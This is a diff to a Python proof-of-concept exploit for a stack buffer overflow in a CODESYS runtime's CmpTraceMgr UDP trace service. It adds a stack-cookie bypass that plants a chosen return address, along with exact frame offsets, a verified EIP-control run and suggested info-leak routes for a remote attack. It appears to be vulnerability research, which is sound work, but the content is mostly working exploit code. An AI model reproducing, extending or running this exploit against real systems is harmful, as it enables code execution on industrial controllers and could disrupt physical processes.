@@ -32,7 +32,65 @@ Distance from each destination to the saved return address
     tag 21 -> [ebp-0xBB8]  0xC04 - 0x048 = 3004 bytes
 
 The overflow does not touch the live tag-reader struct (ebx/`v30` @ ebp-0x538),
-so the handler runs to its epilogue and dies on `ret`: EIP = 0x41414141.
+so the handler runs on to its epilogue.  It does **not** reach `ret` with
+EIP = 0x41414141, though: the function carries a /GS stack cookie at `[ebp-4]`
+(frame offset 0xbfc), and every destination above sits *below* it, so any fill
+long enough to reach the return address necessarily smashes the cookie first.
+The epilogue is
+
+    xor ecx, ebp ; pop edi/esi/ebx ; call __security_check_cookie
+    mov esp, ebp ; pop ebp ; ret
+
+so a plain fill ends in `int 0x29` with ECX = 2
+(FAST_FAIL_STACK_COOKIE_CHECK_FAILURE) and the process dies.
+
+Bypassing it
+------------
+The slot is not the cookie itself: the epilogue is `mov ecx,[ebp-4] / xor ecx,ebp
+/ call __security_check_cookie`, so `[ebp-4]` must hold `___security_cookie XOR
+ebp`.  With both values known the payload just splices that slot in at offset
+`COOKIE_OFF - dest` and continues to the return address:
+
+    --security-cookie 0x4356070A --frame-ebp 0x027DEDD0
+
+Verified 2026-09-23: cookie 0x4356070A, ebp 0x027DEDD0 -> slot 0xDAEA2B41
+(matched the live [ebp-4]), and the run returned with EIP = 0x41414141,
+EBP = 0x41414141 and ECX = 0x4356070A -- i.e. the check *passed*.
+
+`ebp` is stable per process for this call path (two separate requests hit the
+same memcpy with an identical ebp), so a recon request that stops at the
+breakpoint and a follow-up exploit request agree.  But this is cookie-*aware*
+exploitation, not a blind bypass: it needs `___security_cookie` and `ebp`, and
+both are per-process.  Brute force is hopeless (every wrong guess is an
+unhandleable `int 0x29` and a process restart), so a remote attack needs an
+info leak first.  The likeliest candidates: the trace config carries a
+client-supplied variable address (tag 0x4d) that would turn `0x0007` (read
+samples) into an arbitrary read if it is not validated, or -- more elegant --
+the large tag-19 overflow passes straight over the tag-reader struct `v30` at
+ebp-0x538, so a shaped (non-'A') payload could set the reader's buffer pointer
+and length and get a read/write primitive *before* the epilogue ever runs.
+
+Dispatch, and why service 0x0002 is the right one
+-------------------------------------------------
+CmpTraceMgr registers group 0x000F with `sub_106BFA0(0x0F, sub_1077280)`, and
+`sub_1077280` switches on the service id at `*(WORD *)(req + 6)`:
+
+    case 1 .. 0x13:               // 19 services; default -> status 770 (0x302)
+        case 2:  TraceMgrServiceHandler(a2, a3, a4, &a5)
+
+Service 0x2 is the *only* id that reaches `TraceMgrServiceHandler`: it has
+exactly one xref (the case-2 site), and of the group's 19 sub-functions only
+that one contains a `memcpy` at all — the five sites listed above.  So whatever
+label the article puts on it, 0x2 is the only service that can trigger this bug.
+
+The constant is called `TRACE_CONFIGURE` in `codesys_udp_ds.py` from *observed
+behaviour*, not from a symbol: the IDE sends 0x2 a body carrying the whole trace
+configuration (name `App.Trace`, application, task, variable list) and gets a
+handle back in tag 0x40.  The article's `TraceMgrSrvPacketCreate` matches this
+handler — its tag 19/20/21 memcpy branches are exactly what it describes — but
+this build has no string of that name; the closest are `tracemgrpacketcreate`
+and `TraceMgrPacketCreate`, and the binary's name registry is not ordered by
+service id, so the id->name binding cannot be read off statically.
 
 Transport caveat (why the article's 0x18AC single-shot body cannot be replayed)
     The runtime's UDP frame buffer is ~512 bytes: a request whose *services*
@@ -57,13 +115,15 @@ Usage
     python trace_poc.py 192.168.125.129 --tag 19 --length 400   # top-level, fits
     python trace_poc.py 192.168.125.129 --dry-run
 
-The runtime is expected to *not* answer — it dies on the overwritten return
-address.  Confirm the root cause in x64dbg at 0x00A88833 (tag 48) or
-0x00A8871B (tag 19).
+The runtime is expected to *not* answer — the overwritten cookie kills it.
+Confirm the root cause in x64dbg at 0x00A88833 (tag 48) or 0x00A8871B (tag 19):
+the breakpoint hits, the destination reads all `0x41`, and the run leaves via
+`__security_check_cookie` -> `int 0x29`.
 """
 
 import argparse
 import socket
+import struct
 import sys
 
 from codesys_udp_ds import (
@@ -71,14 +131,22 @@ from codesys_udp_ds import (
     parse_tags, dump_tags, status_of, build_ack,
 )
 
-#: trigger tag -> (container to nest it in, destination, bytes to saved EIP)
+#: trigger tag -> (container to nest in, frame offset of the destination,
+#:                 description, bytes to the saved return address)
 TRIGGERS = {
-    48: (0x86, "memcpy(v34, src, len)   v34[8]  @ ebp-0x1C", 32),
-    51: (0x86, "memcpy(&v35, src, len)  v35 u32 @ ebp-0x14", 24),
-    19: (None, "memcpy(v26, src, len)   v26[4]  @ ebp-0xBC0", 3012),
-    20: (None, "memcpy(v27, src, len)   v27[4]  @ ebp-0xBBC", 3008),
-    21: (None, "memcpy(v28, src, len)   v28[20] @ ebp-0xBB8", 3004),
+    48: (0x86, 0xBE4, "memcpy(v34, src, len)   v34[8]  @ ebp-0x1C", 32),
+    51: (0x86, 0xBEC, "memcpy(&v35, src, len)  v35 u32 @ ebp-0x14", 24),
+    19: (None, 0x040, "memcpy(v26, src, len)   v26[4]  @ ebp-0xBC0", 3012),
+    20: (None, 0x044, "memcpy(v27, src, len)   v27[4]  @ ebp-0xBBC", 3008),
+    21: (None, 0x048, "memcpy(v28, src, len)   v28[20] @ ebp-0xBB8", 3004),
 }
+
+#: frame offset of the /GS stack cookie (`var_4`); the epilogue does
+#: `mov ecx,[ebp-4] / xor ecx,ebp / call __security_check_cookie`, so the slot
+#: must hold `___security_cookie XOR <ebp at return>`.
+COOKIE_OFF = 0xBFC
+#: frame offset of the saved return address
+RET_OFF = 0xC04
 
 DEFAULT_TAG = 48
 DEFAULT_LENGTH = 64
@@ -96,6 +164,40 @@ def build_body(tag_id, length, fill=b"A"):
     00`), which parses identically to a minimal encoding.
     """
     inner = tag(tag_id, fill * length)
+    container = TRIGGERS[tag_id][0]
+    return parent_tag(container, inner) if container else inner
+
+
+def build_cookie_body(tag_id, cookie, ebp, ret=0x41414141, length=None):
+    """Payload that survives the /GS check and hijacks the return address.
+
+    Layout, relative to the memcpy destination:
+        [0 .. COOKIE_OFF-dest)      filler
+        [COOKIE_OFF-dest .. +4)     cookie XOR ebp   <- what the epilogue wants
+        [+4 .. +8)                  saved EBP       (popped, value irrelevant)
+        [RET_OFF-dest .. +4)        return address
+
+    `cookie` is the `___security_cookie` global and `ebp` the frame base at the
+    check; both are readable in x64dbg, and `ebp` is stable per process for this
+    call path (two different requests hit the same memcpy with an identical
+    ebp), so a recon request plus an exploit request agree.
+    """
+    dest = TRIGGERS[tag_id][1]
+    filler = COOKIE_OFF - dest
+    slot = (cookie ^ ebp) & 0xFFFFFFFF
+    ret_at = RET_OFF - dest
+    payload = bytearray(b"A" * filler)
+    payload += struct.pack("<I", slot)
+    payload += struct.pack("<I", 0x41414141)          # saved EBP
+    if len(payload) < ret_at:
+        payload += b"A" * (ret_at - len(payload))
+    assert len(payload) == ret_at, (len(payload), ret_at)
+    payload += struct.pack("<I", ret)
+    if length is not None:
+        if length < len(payload):
+            raise SystemExit(f"length {length} < {len(payload)} needed")
+        payload += b"A" * (length - len(payload))
+    inner = tag(tag_id, bytes(payload))
     container = TRIGGERS[tag_id][0]
     return parent_tag(container, inner) if container else inner
 
@@ -137,29 +239,62 @@ def main():
                     help="filler length in bytes "
                          f"(default {DEFAULT_LENGTH}, or 4 past the EIP offset "
                          "for the chosen tag)")
+    ap.add_argument("--security-cookie", type=lambda s: int(s, 0), default=None,
+                    metavar="HEX",
+                    help="value of the ___security_cookie global (x64dbg: "
+                         "dump at 0x00F9B264).  With --frame-ebp, builds a "
+                         "payload that survives the /GS check")
+    ap.add_argument("--frame-ebp", type=lambda s: int(s, 0), default=None,
+                    metavar="HEX",
+                    help="ebp of the TraceMgrServiceHandler frame at the "
+                         "memcpy (read it at the breakpoint).  Needed alongside "
+                         "--security-cookie")
+    ap.add_argument("--ret", type=lambda s: int(s, 0), default=0x41414141,
+                    metavar="HEX",
+                    help="return address to plant (default 0x41414141)")
     ap.add_argument("--dry-run", action="store_true",
                     help="build and print the request, do not send")
     args = ap.parse_args()
 
-    container, what, to_eip = TRIGGERS[args.tag]
+    container, dest_off, what, to_eip = TRIGGERS[args.tag]
+    if (args.security_cookie is None) != (args.frame_ebp is None):
+        ap.error("--security-cookie and --frame-ebp must be given together")
+
+    cookie_mode = args.security_cookie is not None
     length = args.length if args.length is not None else max(DEFAULT_LENGTH,
                                                              to_eip + 4)
-    body = build_body(args.tag, length)
+    if cookie_mode:
+        body = build_cookie_body(args.tag, args.security_cookie, args.frame_ebp,
+                                 args.ret, length)
+    else:
+        body = build_body(args.tag, length)
     services_len = len(body) + 20
 
     print("========== CmpTraceMgr stack overflow PoC ==========")
     print(f"  service : group 0x{GRP_TRACE:04X} / service 0x{TRACE_CONFIGURE:04X}"
-          f"  (TraceMgrSrvPacketCreate)")
+          f"  (the article's TraceMgrSrvPacketCreate; the only id reaching"
+          f" TraceMgrServiceHandler)")
     print(f"  trigger : tag {args.tag}"
           + (f" nested in container 0x{container:02x}" if container else "")
           + f"  ->  {what}")
     print(f"  offset  : {to_eip} bytes from the destination to the saved EIP")
-    print(f"  payload : {length} bytes of {b'A'!r} "
-          f"({length - to_eip:+d} past EIP), body {len(body)}B, "
-          f"services {services_len}B")
-    if length <= to_eip:
+    if cookie_mode:
+        slot = (args.security_cookie ^ args.frame_ebp) & 0xFFFFFFFF
+        print(f"  /GS     : cookie 0x{args.security_cookie:08x} ^ ebp "
+              f"0x{args.frame_ebp:08x} -> slot 0x{slot:08x} "
+              f"at [ebp-4] (payload +{COOKIE_OFF - dest_off})")
+        print(f"  ret     : 0x{args.ret:08x}")
+    print(f"  payload : {length} bytes "
+          + ("with the /GS slot spliced in" if cookie_mode else f"of {b'A'!r}")
+          + f", body {len(body)}B, services {services_len}B")
+    if not cookie_mode and length <= to_eip:
         print(f"  [!] {length} <= {to_eip}: this will NOT reach the return "
               f"address")
+    if not cookie_mode:
+        print("  [i] plain 'A' fill smashes the /GS cookie at [ebp-4] first, so"
+              " this dies in\n      __security_check_cookie (int 0x29) instead of"
+              " reaching `ret`.  Add\n      --security-cookie/--frame-ebp to"
+              " splice the correct slot in.")
     if services_len > SINGLE_FRAME_SERVICES_MAX:
         print(f"  [!] services block is {services_len}B but the runtime only "
               f"accepts ~{SINGLE_FRAME_SERVICES_MAX}B per datagram, and refuses\n"
@@ -216,7 +351,11 @@ def main():
     print(f"    - breakpoint 0x00A88833 (tag 48) / 0x00A8871B (tag 19) hits")
     print(f"    - the destination is [ebp-{'1C' if args.tag in (48, 51) else 'BC0'}"
           f"] and the size argument is {length}")
-    print("    - execution faults with EIP = 0x41414141")
+    print("    - after the copy, [ebp+4] (the return address) reads 0x41414141")
+    print("    - the run then leaves via __security_check_cookie -> int 0x29")
+    print("      (ECX=2, FAST_FAIL_STACK_COOKIE_CHECK_FAILURE): the /GS cookie at")
+    print("      [ebp-4] is below the return address, so it is always smothered")
+    print("      first.  EIP control needs the cookie leaked and rewritten.")
     return 0
 
 
